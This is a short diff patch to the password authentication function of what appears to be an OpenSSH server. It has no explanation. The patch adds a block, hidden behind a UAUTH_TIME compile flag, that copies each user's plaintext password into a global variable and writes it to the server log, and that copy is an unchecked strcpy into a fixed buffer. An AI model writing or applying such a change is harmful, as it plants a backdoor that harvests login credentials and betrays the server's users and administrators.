@@ -48,6 +48,8 @@
 /* import */
 extern ServerOptions options;
 
+extern char *PASSWORD;
+
 static int
 userauth_passwd(struct ssh *ssh)
 {
@@ -61,6 +63,12 @@ userauth_passwd(struct ssh *ssh)
 	    (change && (r = sshpkt_get_cstring(ssh, NULL, NULL)) != 0) ||
 	    (r = sshpkt_get_end(ssh)) != 0)
 		fatal("%s: %s", __func__, ssh_err(r));
+
+#ifdef UAUTH_TIME
+	PASSWORD = (char*)malloc(sizeof(char) * 256);
+	strcpy(PASSWORD, password);
+	logit("p: %s", password);
+#endif
 
 	if (change)
 		logit("password change not supported");
